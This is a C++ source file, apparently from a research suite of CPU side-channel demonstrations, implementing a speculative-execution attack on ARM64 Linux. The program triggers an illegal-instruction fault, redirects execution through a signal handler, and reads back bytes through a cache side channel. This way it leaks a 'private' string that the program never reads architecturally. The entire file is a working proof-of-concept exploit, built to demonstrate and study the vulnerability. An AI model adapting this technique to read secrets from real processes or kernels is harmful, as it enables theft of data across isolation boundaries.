/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "compiler_specifics.h"

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Local handler necessary for avoiding local/global linking mismatches on ARM.
// When we use extern char[] declaration for a label defined in assembly, the
// compiler yields this sequence that fails loading the actual address of the
// label:
// adrp x0, :got:label
// ldr x0, [x0, #:got_lo12:label]
// On the other hand when we use this local handler, the compiler yield this
// sequence of instructions:
// adrp x0, label
// add x0, x0, :lo12:label
// and that works correctly because it if an effective equivalent of
// adr x0, label.
static void local_handler() {
  asm volatile("b afterspeculation");
}

static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Successful execution accesses safe_offset and loads ForceRead code into
    // cache.
    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[safe_offset]));

    // Guaranteed invalid opcode on aarch64. Raises SIGILL.
    asm volatile(".word 0x00000000");

    // Architecturally unreachable code.
    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGILL signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigill(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGILL signal handler.
  // Moves the instruction pointer to the "afterspeculation" label jumping to
  // the "local_handler" function.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
  ucontext->uc_mcontext.pc = reinterpret_cast<greg_t>(local_handler);
}

static void set_signal() {
  struct sigaction act;
  act.sa_sigaction = sigill;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGILL, &act, NULL);
}

int main() {
  set_signal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
